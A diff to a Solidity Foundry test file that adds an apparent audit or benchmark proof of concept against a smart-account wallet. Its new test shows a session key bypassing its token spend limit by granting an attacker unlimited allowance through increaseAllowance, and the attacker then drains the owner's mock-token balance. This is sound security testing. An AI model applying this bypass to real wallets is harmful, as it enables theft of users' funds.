@@ -4,6 +4,7 @@ pragma solidity 0.8.29;
 import {Deploy} from "./../../Deploy.t.sol";
 import {MockERC20} from "src/mocks/MockERC20.sol";
 import {console2 as console} from "lib/forge-std/src/Test.sol";
+import {MockERC20Permit} from "test/aiudit/mocks/MockERC20Permit.sol";
 import {
     PackedUserOperation
 } from "lib/account-abstraction/contracts/interfaces/PackedUserOperation.sol";
@@ -15,7 +16,12 @@ contract TestFindingsEvmBench is Deploy {
     PubKey internal pK;
     PubKey internal pK_SK;
 
+    uint256 attackerAddrPk;
+    address attackerAddr;
+
     bytes32[2] internal modes = [mode_1, mode_3];
+
+    MockERC20Permit internal mockERC20Permit;
 
     modifier registerSkEOASelf() {
         _createCustomFreshKey(
@@ -61,6 +67,9 @@ contract TestFindingsEvmBench is Deploy {
 
     function setUp() public override {
         super.setUp();
+        mockERC20Permit = new MockERC20Permit();
+
+        (attackerAddr, attackerAddrPk) = makeAddrAndKey("attacker");
         reciver = makeAddr("reciver");
         _populateWebAuthn("execution.json", ".batch");
         pK = PubKey({x: DEF_WEBAUTHN.X, y: DEF_WEBAUTHN.Y});
@@ -77,9 +86,6 @@ contract TestFindingsEvmBench is Deploy {
         registerSkEOASelf
         setCanCallM(KeyType.EOA, _getKeyEOA(sessionKey), ANY_TARGET, ANY_FN_SEL, true)
     {
-        console.log("sessionKey", sessionKey);
-        (address attackerAddr, uint256 attackerAddrPk) = makeAddrAndKey("attacker");
-
         KeyDataReg memory attacker = KeyDataReg({
             keyType: KeyType.EOA,
             validUntil: type(uint48).max - 1,
@@ -110,12 +116,64 @@ contract TestFindingsEvmBench is Deploy {
         _relayUserOp(userOp);
     }
 
-    function test_v_002_evmbench() external {
-        console.log("The recovery module applies only on master key, if session key was compromised the owner/master ket can revoke the session key");
-        console.log("Edge case: Master key lost and not have access to the account, in the same time the session key was compromised. In this case owner must to compelte full recovery procces and revoke the session key");
+    function test_v_002_evmbench() external pure {
+        console.log(
+            "The recovery module applies only on master key, if session key was compromised the owner/master ket can revoke the session key"
+        );
+        console.log(
+            "Edge case: Master key lost and not have access to the account, in the same time the session key was compromised. In this case owner must to compelte full recovery procces and revoke the session key"
+        );
     }
 
-    function test_v_003_evmbench() external {
+    function test_v_003_evmbench()
+        external
+        registerSkEOASelf
+        setTokenSpendM(
+            KeyType.EOA,
+            _getKeyEOA(sessionKey),
+            address(mockERC20Permit),
+            10 ether,
+            SpendPeriod.Month
+        )
+        setCanCallM(KeyType.EOA, _getKeyEOA(sessionKey), address(mockERC20Permit), ANY_FN_SEL, true)
+    {
+        vm.prank(owner);
+        mockERC20Permit.mint(owner, 20 ether);
+
+        uint256 balanceAccounBefore = IERC20(mockERC20Permit).balanceOf(owner);
+        uint256 balanceAttackerBefore = IERC20(mockERC20Permit).balanceOf(attackerAddr);
+        assertEq(balanceAccounBefore, 20 ether);
+        assertEq(balanceAttackerBefore, 0 ether);
+
+        bytes memory data = abi.encodeWithSelector(
+            mockERC20Permit.increaseAllowance.selector, attackerAddr, type(uint256).max
+        );
+
+        Call[] memory calls = new Call[](1);
+        calls[0] = _createCall(address(mockERC20Permit), 0, data);
+
+        PackedUserOperation memory userOp = _getFreshUserOp();
+        userOp = _populateUserOp(
+            userOp,
+            _packCallData(mode_1, calls),
+            _packAccountGasLimits(600_000, 400_000),
+            800_000,
+            _packGasFees(80 gwei, 15 gwei),
+            hex""
+        );
+
+        bytes memory signature = _signUserOpWithSK(userOp);
+        userOp.signature = _encodeEOASignature(signature);
+
+        _relayUserOp(userOp);
+
+        vm.prank(attackerAddr);
+        mockERC20Permit.transferFrom(owner, attackerAddr, balanceAccounBefore);
+
+        uint256 balanceAccounAfter = IERC20(mockERC20Permit).balanceOf(owner);
+        uint256 balanceAttackerAfter = IERC20(mockERC20Permit).balanceOf(attackerAddr);
+        assertEq(balanceAccounAfter, 0 ether);
+        assertEq(balanceAttackerAfter, 20 ether);
     }
 
     function _relayUserOp(PackedUserOperation memory _userOp) internal {
